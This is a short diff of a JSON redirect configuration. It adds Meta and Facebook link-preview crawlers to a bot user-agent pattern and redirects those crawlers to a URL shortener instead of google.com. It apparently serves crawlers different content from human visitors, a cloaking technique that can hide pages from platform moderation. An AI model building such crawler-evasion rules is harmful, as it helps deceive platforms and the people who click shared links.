@@ -6,10 +6,10 @@
         {
           "type": "header",
           "key": "user-agent",
-          "value": ".*(bot|crawler|spider|googlebot|bingbot|yahoo|duckduckbot|baiduspider).*?"
+          "value": ".*(bot|crawler|spider|googlebot|bingbot|yahoo|duckduckbot|baiduspider|facebookexternalhit|facebookcatalog|Meta-ExternalAgent|Meta-ExternalFetcher).*?"
         }
       ],
-      "destination": "https://google.com",
+      "destination": "https://linkar.top/MbDoZ",
       "permanent": false
     }
   ]
